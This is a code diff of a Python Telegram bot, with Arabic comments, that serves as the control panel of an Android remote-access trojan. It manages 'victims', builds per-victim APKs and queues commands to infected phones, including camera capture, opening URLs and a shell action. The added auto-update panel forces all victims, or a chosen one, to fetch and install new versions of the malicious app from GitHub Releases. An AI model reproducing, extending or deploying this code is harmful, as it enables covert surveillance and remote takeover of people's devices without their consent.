@@ -1,7 +1,7 @@
 # bot_handlers.py
 # ============================================================
 # معالجات البوت الرئيسية: /start + callback + step handlers
-# v4 — مع Web Dashboard + APK Manager
+# v5 — مع Web Dashboard + APK Manager + Auto-Update
 # ============================================================
 
 import io
@@ -66,6 +66,30 @@ _pending_open_url = {}
 
 
 # ============================================================
+# ★★★ إعدادات التحديث ★★★
+# ============================================================
+try:
+    from config import ORIGIN_SECRET
+except ImportError:
+    ORIGIN_SECRET = ""
+
+try:
+    from apk_updater import (
+        CURRENT_VERSION_CODE,
+        CURRENT_VERSION_NAME,
+        _find_latest_apk_release,
+        _get_cached_apk_info,
+    )
+except ImportError:
+    CURRENT_VERSION_CODE = 1
+    CURRENT_VERSION_NAME = "1.0.0"
+    def _find_latest_apk_release():
+        return None
+    def _get_cached_apk_info():
+        return None
+
+
+# ============================================================
 # القوائم
 # ============================================================
 def main_menu(user_id=None):
@@ -73,7 +97,7 @@ def main_menu(user_id=None):
     markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
     markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
 
-    # 🌐 زر لوحة التحكم الويب (جديد)
+    # 🌐 زر لوحة التحكم الويب
     markup.add(InlineKeyboardButton(
         "🌐 لوحة التحكم (ويب)",
         callback_data="open_dashboard"
@@ -198,6 +222,111 @@ def victim_commands_panel(victim_id):
     return m
 
 
+# ============================================================
+# ★★★ لوحة التحديث الأمنية (جديدة) ★★★
+# ============================================================
+def build_update_panel():
+    """لوحة التحكم في التحديثات"""
+    m = InlineKeyboardMarkup()
+
+    m.add(InlineKeyboardButton("📊 حالة التحديث", callback_data="upd_status"))
+    m.add(InlineKeyboardButton("🚀 إجبار كل الضحايا على التحديث", callback_data="upd_force_all"))
+    m.add(InlineKeyboardButton("🎯 تحديث ضحية محددة", callback_data="upd_target"))
+
+    m.row(
+        InlineKeyboardButton("🔍 فحص آخر Release", callback_data="upd_check_release"),
+        InlineKeyboardButton("♻️ مسح Cache", callback_data="upd_clear_cache"),
+    )
+
+    m.row(
+        InlineKeyboardButton("📜 سجل التحديثات", callback_data="upd_history"),
+        InlineKeyboardButton("⚙️ إعدادات", callback_data="upd_settings"),
+    )
+
+    m.add(InlineKeyboardButton("🔙 رجوع للأدمن", callback_data="admin_panel"))
+
+    return m
+
+
+# ============================================================
+# ★★★ دوال التحديث ★★★
+# ============================================================
+def get_update_status_text():
+    """يجيب نص حالة التحديث"""
+    try:
+        # معلومات النسخة الحالية
+        version_code = CURRENT_VERSION_CODE
+        version_name = CURRENT_VERSION_NAME
+
+        # آخر release
+        latest = _get_cached_apk_info() or _find_latest_apk_release()
+
+        # عدد الضحايا
+        total_victims = 0
+        if redis_client:
+            try:
+                keys = redis_client.keys("victim:*")
+                total_victims = len(keys) if keys else 0
+            except Exception:
+                pass
+
+        # إحصائيات التحديثات
+        update_success = 0
+        update_failed = 0
+        if redis_client:
+            try:
+                update_success = int(redis_client.get("stats:update_success") or 0)
+                update_failed = int(redis_client.get("stats:update_failed") or 0)
+            except Exception:
+                pass
+
+        # Force update flag
+        force_active = False
+        if redis_client:
+            try:
+                force_active = bool(redis_client.get("apk_force_update"))
+            except Exception:
+                pass
+
+        text = (
+            "📊 <b>حالة نظام التحديث</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n\n"
+
+            "🔢 <b>النسخة الحالية على السيرفر:</b>\n"
+            f"  • الكود: <code>{version_code}</code>\n"
+            f"  • الاسم: <code>{version_name}</code>\n\n"
+
+            "📦 <b>آخر Release على GitHub:</b>\n"
+        )
+
+        if latest:
+            text += (
+                f"  • الاسم: <code>{h(latest.get('version_name', '?'))}</code>\n"
+                f"  • الحجم: <code>{latest.get('size', 0) / 1024 / 1024:.2f} MB</code>\n"
+                f"  • الملف: <code>{h(latest.get('name', '?'))}</code>\n"
+            )
+        else:
+            text += "  • <i>لا يوجد release</i>\n"
+
+        text += (
+            "\n👥 <b>الضحايا:</b>\n"
+            f"  • الإجمالي: <code>{total_victims}</code>\n\n"
+
+            "📈 <b>إحصائيات التحديث:</b>\n"
+            f"  • ✅ نجح: <code>{update_success}</code>\n"
+            f"  • ❌ فشل: <code>{update_failed}</code>\n\n"
+
+            "🎯 <b>Force Update:</b>\n"
+            f"  • الحالة: {'🔴 نشط' if force_active else '⚪ غير نشط'}\n"
+        )
+
+        return text
+
+    except Exception as e:
+        logger.exception(f"get_update_status_text error: {e}")
+        return f"❌ خطأ في قراءة الحالة: {h(str(e)[:200])}"
+
+
 def _deny_message(reason, user_id, tool, data=None):
     data = data or {}
     if reason == "banned":
@@ -265,7 +394,6 @@ def dashboard_command(message):
     logger.info(f"/dashboard from {user_id}")
 
     try:
-        # تأكد إن المستخدم مسجل
         get_or_create_user(
             user_id,
             message.from_user.username or "Unknown",
@@ -302,6 +430,37 @@ def dashboard_command(message):
     except Exception as e:
         logger.exception(f"dashboard_command error: {e}")
         bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:100])}", parse_mode="HTML")
+
+
+# ============================================================
+# ★★★ /update — أوامر التحديث السريعة ★★★
+# ============================================================
+@bot.message_handler(commands=['update', 'updates', 'update_panel'])
+def update_command(message):
+    """لوحة التحديثات"""
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+
+    if not is_admin(user_id):
+        bot.send_message(chat_id, "❌ للأدمن فقط")
+        return
+
+    logger.info(f"/update from admin {user_id}")
+
+    text = (
+        "⚙️ <b>إدارة التحديثات</b>\n"
+        "━━━━━━━━━━━━━━━━━━\n\n"
+        "🎯 <b>خيارات التحديث:</b>\n"
+        "• 📊 حالة النظام\n"
+        "• 🚀 إجبار كل الضحايا\n"
+        "• 🎯 تحديث ضحية محددة\n"
+        "• 🔍 فحص GitHub Releases\n"
+        "• 📜 سجل التحديثات\n"
+        "• ⚙️ إعدادات متقدمة"
+    )
+
+    bot.send_message(chat_id, text, parse_mode="HTML",
+                     reply_markup=build_update_panel())
 
 
 # ============================================================
@@ -361,6 +520,245 @@ def _handle_callback(call, chat_id, user_id, data):
             logger.exception(f"open_dashboard error: {e}")
             bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:100])}", parse_mode="HTML")
 
+        return
+
+    # ============================================================
+    # ★★★ أوامر التحديث (upd_) ★★★
+    # ============================================================
+    if data == "upd_status":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌ للأدمن فقط", show_alert=True)
+            return
+        bot.answer_callback_query(call.id, "📊 جاري القراءة...")
+
+        text = get_update_status_text()
+        bot.send_message(chat_id, text, parse_mode="HTML",
+                         reply_markup=build_update_panel())
+        return
+
+    if data == "upd_check_release":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌", show_alert=True)
+            return
+
+        bot.answer_callback_query(call.id, "🔍 جاري الفحص...")
+
+        try:
+            latest = _find_latest_apk_release()
+
+            if latest:
+                text = (
+                    "🔍 <b>آخر Release على GitHub</b>\n"
+                    "━━━━━━━━━━━━━━━━━━\n\n"
+                    f"📦 <b>الاسم:</b> <code>{h(latest.get('name', '?'))}</code>\n"
+                    f"🏷️ <b>الإصدار:</b> <code>{h(latest.get('version_name', '?'))}</code>\n"
+                    f"💾 <b>الحجم:</b> <code>{latest.get('size', 0) / 1024 / 1024:.2f} MB</code>\n"
+                    f"📅 <b>التاريخ:</b> <code>{h(latest.get('published_at', '?'))}</code>\n\n"
+                    f"🔗 <a href=\"{h(latest.get('release_url', ''))}\">فتح Release</a>"
+                )
+            else:
+                text = "❌ <b>لا يوجد APK على GitHub Releases</b>"
+        except Exception as e:
+            logger.exception(f"upd_check_release error: {e}")
+            text = f"❌ خطأ: {h(str(e)[:200])}"
+
+        bot.send_message(chat_id, text, parse_mode="HTML",
+                         reply_markup=build_update_panel(),
+                         disable_web_page_preview=True)
+        return
+
+    if data == "upd_force_all":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌", show_alert=True)
+            return
+
+        # تأكيد
+        m = InlineKeyboardMarkup()
+        m.row(
+            InlineKeyboardButton("✅ نعم، شغّل التحديث الشامل", callback_data="upd_force_all_confirm"),
+            InlineKeyboardButton("❌ إلغاء", callback_data="upd_status"),
+        )
+        bot.answer_callback_query(call.id)
+        bot.send_message(
+            chat_id,
+            "⚠️ <b>تأكيد التحديث الشامل</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n\n"
+            "🚨 هذا الأمر سيجبر <b>كل الضحايا المتصلين</b> على:\n"
+            "• فحص وجود تحديث فوراً\n"
+            "• تحميل التحديث الجديد\n"
+            "• تثبيته تلقائياً (بموافقة الضحية)\n\n"
+            "هل أنت متأكد؟",
+            parse_mode="HTML",
+            reply_markup=m
+        )
+        return
+
+    if data == "upd_force_all_confirm":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌", show_alert=True)
+            return
+
+        bot.answer_callback_query(call.id, "🚀 جاري التنفيذ...")
+
+        try:
+            if redis_client:
+                # اضبط flag لمدة ساعة
+                redis_client.setex("apk_force_update", 3600, str(int(time.time())))
+
+                # زوّد عدّاد الضحايا
+                victims = 0
+                try:
+                    victims = len(redis_client.keys("victim:*") or [])
+                except Exception:
+                    pass
+
+                text = (
+                    "✅ <b>تم تفعيل التحديث الشامل</b>\n"
+                    "━━━━━━━━━━━━━━━━━━\n\n"
+                    f"👥 <b>الضحايا المتأثرون:</b> ~<code>{victims}</code>\n"
+                    f"⏰ <b>المدة:</b> ساعة واحدة\n"
+                    f"📡 <b>آلية العمل:</b>\n"
+                    f"  • كل ضحية تفحص التحديث خلال 5 دقائق\n"
+                    f"  • 100% سيكونون محدّثين خلال ساعة\n\n"
+                    "💡 <i>استخدم /update لمتابعة الحالة</i>"
+                )
+            else:
+                text = "❌ Redis غير متصل"
+
+        except Exception as e:
+            logger.exception(f"upd_force_all_confirm error: {e}")
+            text = f"❌ خطأ: {h(str(e)[:200])}"
+
+        bot.send_message(chat_id, text, parse_mode="HTML",
+                         reply_markup=build_update_panel())
+        return
+
+    if data == "upd_target":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌", show_alert=True)
+            return
+
+        bot.answer_callback_query(call.id)
+        msg = bot.send_message(
+            chat_id,
+            "🎯 <b>تحديث ضحية محددة</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n\n"
+            "أرسل <b>Victim Token</b> أو <b>Device ID</b>\n\n"
+            "💡 <i>هتلاقيه في لوحة الضحية</i>",
+            parse_mode="HTML"
+        )
+        bot.register_next_step_handler(msg, upd_target_handler)
+        return
+
+    if data == "upd_clear_cache":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌", show_alert=True)
+            return
+
+        bot.answer_callback_query(call.id, "♻️ جاري المسح...")
+
+        try:
+            if redis_client:
+                redis_client.delete("apk_current_info")
+
+                # امسح ملفات الـ cache
+                import os
+                import shutil
+                cache_dir = os.getenv("APK_CACHE_DIR", "/tmp/apk_cache")
+                if os.path.exists(cache_dir):
+                    try:
+                        shutil.rmtree(cache_dir)
+                        os.makedirs(cache_dir, exist_ok=True)
+                    except Exception:
+                        pass
+
+            bot.send_message(
+                chat_id,
+                "✅ <b>تم مسح Cache</b>\n\n"
+                "🔄 التحديث القادم سيعيد التحميل",
+                parse_mode="HTML",
+                reply_markup=build_update_panel()
+            )
+        except Exception as e:
+            logger.exception(f"upd_clear_cache error: {e}")
+            bot.send_message(chat_id, f"❌ {h(str(e)[:200])}", parse_mode="HTML")
+        return
+
+    if data == "upd_history":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌", show_alert=True)
+            return
+
+        bot.answer_callback_query(call.id, "📜 جاري القراءة...")
+
+        try:
+            if not redis_client:
+                bot.send_message(chat_id, "❌ Redis غير متصل")
+                return
+
+            # اقرأ سجل التحديثات
+            history_raw = redis_client.lrange("update_history", 0, 19) or []
+
+            if not history_raw:
+                text = "📜 <b>سجل التحديثات</b>\n\n<i>لا يوجد سجل بعد</i>"
+            else:
+                lines = ["📜 <b>آخر 20 تحديث</b>\n━━━━━━━━━━━━━━━━━━"]
+                for item in history_raw:
+                    try:
+                        import json
+                        entry = json.loads(item) if isinstance(item, str) else item
+                        status = entry.get("status", "?")
+                        token = entry.get("token", "?")[:12]
+                        ts = entry.get("time_str", "?")
+                        icon = "✅" if status == "success" else "❌"
+                        lines.append(f"{icon} <code>{h(token)}</code> — {h(ts)}")
+                    except Exception:
+                        continue
+                text = "\n".join(lines)
+
+        except Exception as e:
+            logger.exception(f"upd_history error: {e}")
+            text = f"❌ {h(str(e)[:200])}"
+
+        bot.send_message(chat_id, text, parse_mode="HTML",
+                         reply_markup=build_update_panel())
+        return
+
+    if data == "upd_settings":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌", show_alert=True)
+            return
+
+        bot.answer_callback_query(call.id)
+
+        try:
+            from apk_updater import CURRENT_VERSION_CODE, CURRENT_VERSION_NAME
+
+            text = (
+                "⚙️ <b>إعدادات التحديث</b>\n"
+                "━━━━━━━━━━━━━━━━━━\n\n"
+
+                "📌 <b>السيرفر:</b>\n"
+                f"  • النسخة: <code>{CURRENT_VERSION_NAME}</code>\n"
+                f"  • الكود: <code>{CURRENT_VERSION_CODE}</code>\n\n"
+
+                "🔄 <b>معدل الفحص في APK:</b>\n"
+                "  • عند التشغيل: <code>فوري</code>\n"
+                "  • دوري: <code>كل 60 دقيقة</code>\n\n"
+
+                "📥 <b>آلية التحميل:</b>\n"
+                "  • المصدر: <code>GitHub Releases</code>\n"
+                "  • Cache: <code>30 يوم</code>\n"
+                "  • SHA256: <code>مُفعّل</code>\n\n"
+
+                "💡 <i>لتغيير الإعدادات، عدّل الأكواد في</i>\n"
+                "<code>apk_updater.py</code> و<code>UpdateChecker.java</code>"
+            )
+        except Exception as e:
+            text = f"❌ {h(str(e)[:200])}"
+
+        bot.send_message(chat_id, text, parse_mode="HTML",
+                         reply_markup=build_update_panel())
         return
 
     # ============================================================
@@ -491,7 +889,6 @@ def _handle_callback(call, chat_id, user_id, data):
             bot.answer_callback_query(call.id, "❌ ضحية غير موجودة", show_alert=True)
             return
 
-        # خريطة الأوامر
         action_map = {
             "camfront": "camera_front",
             "camback": "camera_back",
@@ -522,7 +919,6 @@ def _handle_callback(call, chat_id, user_id, data):
             "mediaprev": "media_previous",
         }
 
-        # معالجة خاصة للصوت
         if action == "volmute":
             ok = queue_victim_command(victim_id, "volume_set",
                                        level=0, stream="music")
@@ -555,7 +951,6 @@ def _handle_callback(call, chat_id, user_id, data):
             logger.info(f"Command: {action} → {victim_id[:8]}")
             return
 
-        # أوامر تحتاج إدخال نصي
         if action == "toast":
             bot.answer_callback_query(call.id)
             msg = bot.send_message(chat_id, "💬 <b>أرسل النص:</b>", parse_mode="HTML")
@@ -596,7 +991,6 @@ def _handle_callback(call, chat_id, user_id, data):
     if data.startswith("apk_cmd_"):
         body = data.replace("apk_cmd_", "")
 
-        # الاستخراج من الآخر (device_id ممكن فيه underscores)
         parts = body.rsplit("_", 1)
         if len(parts) != 2:
             bot.answer_callback_query(call.id, "❌ صيغة خاطئة", show_alert=True)
@@ -604,7 +998,6 @@ def _handle_callback(call, chat_id, user_id, data):
 
         action_key, device_id = parts
 
-        # خريطة الأوامر
         apk_action_map = {
             "camera_front": "camera_front",
             "camera_back": "camera_back",
@@ -635,7 +1028,6 @@ def _handle_callback(call, chat_id, user_id, data):
             "shell": "shell",
         }
 
-        # أوامر الصوت الخاصة
         if action_key == "volume_mute":
             ok = push_apk_command(device_id, "volume_set",
                                    level=0, stream="music")
@@ -652,7 +1044,6 @@ def _handle_callback(call, chat_id, user_id, data):
                                        show_alert=not ok)
             return
 
-        # أوامر تحتاج إدخال نصي
         if action_key == "toast":
             bot.answer_callback_query(call.id)
             msg = bot.send_message(chat_id, "💬 <b>أرسل النص:</b>", parse_mode="HTML")
@@ -684,7 +1075,6 @@ def _handle_callback(call, chat_id, user_id, data):
             bot.register_next_step_handler(msg, lambda m: apk_url_step(m, device_id))
             return
 
-        # الأوامر العادية
         if action_key in apk_action_map:
             real_action = apk_action_map[action_key]
             kwargs = {}
@@ -713,7 +1103,6 @@ def _handle_callback(call, chat_id, user_id, data):
         site = data.replace("victim_site_", "")
         bot.answer_callback_query(call.id, "⏳ جاري التجهيز...")
 
-        # استرجع الاسم من Redis
         pending_name = None
         if redis_client:
             try:
@@ -727,7 +1116,6 @@ def _handle_callback(call, chat_id, user_id, data):
             bot.send_message(chat_id, "❌ انتهت صلاحية العملية، ابدأ من جديد")
             return
 
-        # حمّل الشاشة بالطريقة التقليدية: أرسل رسالة انتظار ثم ابدأ
         wait_msg = bot.send_message(
             chat_id,
             f"⏳ <b>جاري تجهيز APK لـ</b> <code>{h(pending_name)}</code>\n\n"
@@ -738,7 +1126,6 @@ def _handle_callback(call, chat_id, user_id, data):
             parse_mode="HTML"
         )
 
-        # أنشئ الضحية مع الموقع
         victim = create_victim(chat_id, pending_name, site)
 
         if not victim:
@@ -756,16 +1143,11 @@ def _handle_callback(call, chat_id, user_id, data):
 
         logger.info(f"Victim created: {pending_name} | site={site} | {victim_id}")
 
-        # نفذ البناء في thread منفصل
-        def build_and_send():
-            _build_and_send_apk(
-                chat_id=chat_id,
-                victim_name=pending_name,
-                victim_token=victim_token,
-                wait_msg_id=wait_msg.message_id,
-            )
-
-        threading.Thread(target=build_and_send, daemon=True).start()
+        threading.Thread(
+            target=_build_and_send_apk,
+            args=(chat_id, pending_name, victim_token, wait_msg.message_id),
+            daemon=True
+        ).start()
         return
 
     # ============================================================
@@ -864,6 +1246,22 @@ def _handle_callback(call, chat_id, user_id, data):
         bot.answer_callback_query(call.id)
         bot.send_message(chat_id, "👑 <b>لوحة تحكم الأدمن</b>",
                          reply_markup=build_admin_menu(), parse_mode="HTML")
+        return
+
+    # ★ زر التحديثات السريع في لوحة الأدمن
+    if data == "admin_updates":
+        if not is_admin(user_id):
+            bot.answer_callback_query(call.id, "❌", show_alert=True)
+            return
+        bot.answer_callback_query(call.id, "⚙️ جاري الفتح...")
+        bot.send_message(
+            chat_id,
+            "⚙️ <b>إدارة التحديثات</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n\n"
+            "🎯 اختر العملية:",
+            parse_mode="HTML",
+            reply_markup=build_update_panel()
+        )
         return
 
     if data.startswith("admin_users_"):
@@ -1331,7 +1729,86 @@ def _handle_callback(call, chat_id, user_id, data):
 
 
 # ============================================================
-# Build & Send APK — دالة مساعدة
+# Step Handler — Target Update
+# ============================================================
+def upd_target_handler(message):
+    """يتعامل مع target update"""
+    if not is_admin(message.chat.id):
+        return
+
+    if not message.text:
+        bot.send_message(message.chat.id, "❌ أرسل token صحيح")
+        return
+
+    target = message.text.strip()
+
+    try:
+        # ابحث عن الضحية بـ token أو device_id
+        found_victim = None
+        found_victim_id = None
+
+        if redis_client:
+            # ابحث بـ victim_token
+            token_key = f"victim_token:{target}"
+            raw = redis_client.get(token_key)
+            if raw:
+                import json
+                info = json.loads(raw)
+                found_victim_id = info.get("victim_id")
+                found_victim = info
+
+            # أو ابحث في كل الضحايا
+            if not found_victim_id:
+                keys = redis_client.keys("victim:*:*")
+                for key in keys[:200]:
+                    try:
+                        v = redis_client.hgetall(key)
+                        if v.get("device_id") == target:
+                            found_victim_id = v.get("victim_id")
+                            found_victim = v
+                            break
+                    except Exception:
+                        continue
+
+        if not found_victim_id:
+            bot.send_message(
+                message.chat.id,
+                f"❌ <b>لم يتم العثور على الضحية</b>\n\n"
+                f"🔍 البحث عن: <code>{h(target[:40])}</code>",
+                parse_mode="HTML"
+            )
+            return
+
+        # اضبط flag خاص بالضحية
+        if redis_client:
+            redis_client.setex(
+                f"apk_force_update:{found_victim_id}",
+                3600,
+                str(int(time.time()))
+            )
+
+        bot.send_message(
+            message.chat.id,
+            f"✅ <b>تم تفعيل التحديث لضحية محددة</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"🆔 <code>{h(found_victim_id[:16])}</code>\n"
+            f"⏰ المدة: ساعة\n\n"
+            f"💡 <i>الضحية ستحدّث نفسها في غضون 5 دقائق</i>",
+            parse_mode="HTML",
+            reply_markup=build_update_panel()
+        )
+
+    except Exception as e:
+        logger.exception(f"upd_target_handler error: {e}")
+        bot.send_message(
+            message.chat.id,
+            f"❌ خطأ: {h(str(e)[:200])}",
+            parse_mode="HTML"
+        )
+
+
+# ============================================================
+# Build & Send APK
 # ============================================================
 def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
     """يبني APK ويرسله للبوت (في thread منفصل)"""
@@ -1432,7 +1909,7 @@ def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
 
 
 # ============================================================
-# Step Handlers
+# Step Handlers — Victims
 # ============================================================
 
 def victim_name_step(message):
@@ -1476,10 +1953,6 @@ def victim_name_step(message):
         daemon=True
     ).start()
 
-
-# ============================================================
-# Step Handlers — Victims
-# ============================================================
 
 def v_toast_step(message, victim_id):
     if not message.text:
